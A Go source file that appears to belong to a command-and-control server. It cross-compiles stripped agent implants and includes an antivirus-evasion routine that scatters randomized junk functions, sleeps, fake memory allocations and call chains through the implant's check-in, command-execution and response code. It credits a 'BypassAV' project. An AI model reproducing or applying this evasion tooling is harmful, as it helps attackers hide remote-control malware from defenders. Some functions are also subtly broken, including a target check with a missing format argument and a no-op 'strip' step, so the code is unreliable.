package server

import (
	"bytes"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"time"
)

//thx moloch--
var validCompilerTargets = map[string]bool{
	"darwin/386":      true,
	"darwin/amd64":    true,
	"dragonfly/amd64": true,
	"freebsd/386":     true,
	"freebsd/amd64":   true,
	"freebsd/arm":     true,
	"linux/386":       true,
	"linux/amd64":     true,
	"linux/arm":       true,
	"linux/arm64":     true,
	"linux/ppc64":     true,
	"linux/ppc64le":   true,
	"linux/mips":      true,
	"linux/mipsle":    true,
	"linux/mips64":    true,
	"linux/mips64le":  true,
	"linux/s390x":     true,
	"netbsd/386":      true,
	"netbsd/amd64":    true,
	"netbsd/arm":      true,
	"openbsd/386":     true,
	"openbsd/amd64":   true,
	"openbsd/arm":     true,
	"plan9/386":       true,
	"plan9/amd64":     true,
	"plan9/arm":       true,
	"solaris/amd64":   true,
	"windows/386":     true,
	"windows/amd64":   true,
}

type GoConfig struct {
	CGO     string
	GOOS    string
	GOARCH  string
	GOROOT  string
	GOPATH  string
	LDFLAGS []string
}

func GetGoRoot() string {
	return os.Getenv("GOROOT")
}

func GetGoPath() string {
	return os.Getenv("GOPATH")
}

func GetValidTarget(os, arc string) bool {
	target := fmt.Sprintf("%s/%s", os)
	_, ok := validCompilerTargets[target]
	return ok
}

func GoCmd(config GoConfig, cwd string, command []string) error {
	target := fmt.Sprintf("%s/%s", config.GOOS, config.GOARCH)
	if _, ok := validCompilerTargets[target]; !ok {
		return fmt.Errorf(fmt.Sprintf("Invalid compiler target: %s", target))
	}
	ldf := "-w -s"
	if config.GOOS == "windows" {
		ldf += " -H windowsgui"
	}
	command = append(command, "-ldflags")
	command = append(command, ldf)

	command = append(command) //strip binary
	fmt.Println("Executing: go", command)
	cmd := exec.Command("go", command...)
	cmd.Dir = cwd
	cmd.Env = os.Environ()
	cmd.Env = append(cmd.Env, []string{
		fmt.Sprintf("CGO_ENABLED=%s", config.CGO),
		fmt.Sprintf("GOOS=%s", config.GOOS),
		fmt.Sprintf("GOARCH=%s", config.GOARCH),
		fmt.Sprintf("GOROOT=%s", config.GOROOT),
		fmt.Sprintf("GOPATH=%s", config.GOPATH),
		fmt.Sprintf("PATH=%sbin", config.GOROOT),
	}...)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {
		log.Printf("--- stdout ---\n%s\n", stdout.String())
		log.Printf("--- stderr ---\n%s\n", stderr.String())
		log.Print(err)
	}

	return err
}

type AgentCode struct {
	Imports,
	GlobalVars,
	Checkin,
	Init,
	GetCommand,
	ExecCommand,
	SendResponse,
	AVoidance string
}

func (ac *AgentCode) AVoid(s string) {
	//do the avoidance stuff and things
	rand.Seed(time.Now().UnixNano())
	stb = fmt.Sprintf(stbo,
		fmt.Sprintf("RandStringRunes(%d)", rand.Intn(100)),
		fmt.Sprintf("RandStringRunes(%d)", rand.Intn(100)),
		fmt.Sprintf("RandStringRunes(%d)", rand.Intn(100)),
		"len(s)/2",
		"len(s)-1",
	)
	stb2 = fmt.Sprintf(stbo2,
		fmt.Sprintf("RandStringRunes(%d)", rand.Intn(100)),
		fmt.Sprintf("RandStringRunes(%d)", rand.Intn(100)),
		fmt.Sprintf("RandStringRunes(%d)", rand.Intn(100)),
		"len(s)/2",
		"len(s)-1",
	)
	ac.GlobalVars = "*/\nvar x []byte\n/*" + ac.GlobalVars
	sleeper = fmt.Sprintf(sleepero, rand.Intn(30))
	bufsize := rand.Intn(10000) + 10
	fakemem = fmt.Sprintf(fakememo, rand.Intn(30), rand.Intn(10000), bufsize, rand.Intn(bufsize-5), rand.Intn(254))
	bufsize = rand.Intn(100) + 10
	smallmem = fmt.Sprintf(smallmemo, rand.Intn(30), rand.Intn(10000), bufsize, rand.Intn(bufsize-5), rand.Intn(254))
	ac.AVoidance = `*/` + stb + stb2 + sleeper + fakemem + hops + smallmem + `/*`
	//put sleep on init
	ac.Init = "*/" + "\nsleeper()\n" + "/*" + ac.Init
	//start a async random order thingo
	ac.Init = "*/" + fmt.Sprintf("go hop%d()\n", rand.Intn(9)) + "/*" + ac.Init
	for x := 0; x < rand.Intn(100); x++ {
		if rand.Intn(2) == 1 {
			ac.Checkin = "*/" + fmt.Sprintf("hop%d()\n", rand.Intn(9)) + "/*" + ac.Checkin
			if rand.Intn(2) == 1 {
				ac.Checkin = "*/" + fmt.Sprintf(`x=doStuff1(RandStringRunes(%d))
			if x != nil {
			}
			`, rand.Intn(10)) + "/*" + ac.Checkin
			}
		}
		if rand.Intn(2) == 1 {
			ac.Init = "*/" + fmt.Sprintf("hop%d()\n", rand.Intn(9)) + "/*" + ac.Init
			if rand.Intn(2) == 1 {
				ac.Init = "*/" + fmt.Sprintf(`x=doStuff2(RandStringRunes(%d))
			if x != nil {
			}
			`, rand.Intn(10)) + "/*" + ac.Init
			}
		}
		if rand.Intn(2) == 1 {
			ac.GetCommand = "*/" + fmt.Sprintf("hop%d()\n", rand.Intn(9)) + "/*" + ac.GetCommand
			if rand.Intn(2) == 1 {
				ac.GetCommand = "*/" + fmt.Sprintf(`x=doStuff1(RandStringRunes(%d))
			if x != nil {
			}
			`, rand.Intn(10)) + "/*" + ac.GetCommand
			}
		}
		if rand.Intn(2) == 1 {
			ac.ExecCommand = "*/" + fmt.Sprintf("hop%d()\n", rand.Intn(9)) + "/*" + ac.ExecCommand
		}
		if rand.Intn(2) == 1 {
			ac.ExecCommand = "*/" + fmt.Sprintf(`x=doStuff1(RandStringRunes(%d))
		if x != nil {
		}
		`, rand.Intn(10)) + "/*" + ac.ExecCommand
		}

		if rand.Intn(2) == 1 {
			ac.SendResponse = "*/" + fmt.Sprintf("hop%d()\n", rand.Intn(9)) + "/*" + ac.SendResponse
		}
		if rand.Intn(2) == 1 {
			ac.SendResponse = "*/" + fmt.Sprintf(`x=doStuff1(RandStringRunes(%d))
		if x != nil {
		}
		`, rand.Intn(10)) + "/*" + ac.SendResponse
		}
	}

}

var stb = ``

const stbo = `
func doStuff1(s string) []byte {
	s = %s + %s + %s
	s = s[%s:%s]
	allocateSmallmemory()
	hops[rand.Intn(len(hops))]()
	return []byte(s)
}
`

var stb2 = ``

const stbo2 = `
func doStuff2(s string) []byte {
	s = %s + %s + %s
	s = s[%s:%s]
	allocateFakeMemory()
	hops[rand.Intn(len(hops))]()
	return []byte(s)
}
`

var sleeper = ``

const sleepero = `
func sleeper(){
	time.Sleep(%d)
}
`

var smallmem = ``

const smallmemo = `
func allocateSmallmemory()  { 
	for i := 0; i < %d; i++ {
	  var size int = %d+1
	  hops[rand.Intn(len(hops))]()
	  Buffer_1 := make([]byte, size)
	  Buffer_1[size-1] = 1
	  var Buffer_2 [%d]byte
	  Buffer_2[%d] = %d
	}
  }
`

//https://github.com/EgeBalci/EGESPLOIT/blob/master/BypassAV.go
var fakemem = ``

const fakememo = `
func allocateFakeMemory()  { 
	for i := 0; i < %d; i++ {
	  var size int = %d+1
	  hops[rand.Intn(len(hops))]()
	  Buffer_1 := make([]byte, size)
	  Buffer_1[size-1] = 1
	  var Buffer_2 [%d]byte
	  Buffer_2[%d] = %d
	}
  }
`

const hops = `
var hops []func() = []func(){
	hop0,
	hop1,
	hop2,
	hop3,
	hop4,
	hop5,
	hop6,
	hop7,
	hop8,
	hop9,
	hop10,
}
var magicNumber int64 = 0
func hop0() {
	magicNumber++
	hop1()
}
func hop1() {
	magicNumber++
	hop2()
  }
  func hop2() {
	magicNumber++
	hop3()
  }
  func hop3() {
	magicNumber++
	hop4()
  }
  func hop4() {
	magicNumber++
	hop5()
  }
  func hop5() {
	magicNumber++
	hop6()
  }
  func hop6() {
	magicNumber++
	hop7()
  }
  func hop7() {
	magicNumber++
	hop8()
  }
  func hop8() {
	magicNumber++
	hop9()
  }
  func hop9() {
	magicNumber++
	hop10()
  }
  func hop10() {
	magicNumber++
  }
  `
